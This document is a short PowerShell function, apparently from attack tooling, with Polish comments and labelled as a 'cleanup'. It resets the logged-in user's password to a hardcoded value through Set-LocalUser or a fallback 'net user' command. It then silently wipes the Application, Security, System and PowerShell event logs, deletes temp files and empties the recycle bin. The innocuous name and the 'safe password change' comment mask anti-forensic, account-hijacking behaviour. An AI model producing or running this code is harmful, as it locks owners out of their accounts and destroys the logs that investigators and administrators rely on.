function Invoke-Cleanup {
    # Bezpieczna zmiana hasła
    $newPassword = ConvertTo-SecureString "Z@bezpieczneHaslo123!" -AsPlainText -Force
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    try {
        Set-LocalUser -Name $user -Password $newPassword -ErrorAction Stop
    }
    catch {
        # Awaryjna metoda zmiany hasła
        $command = "net user $user Z@bezpieczneHaslo123!"
        cmd.exe /c $command
    }

    # Czyszczenie dzienników
    $logTypes = @('Application', 'Security', 'System', 'Windows PowerShell')
    foreach ($log in $logTypes) {
        wevtutil cl $log 2>&1 | Out-Null
    }

    # Czyszczenie innych śladów
    Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}
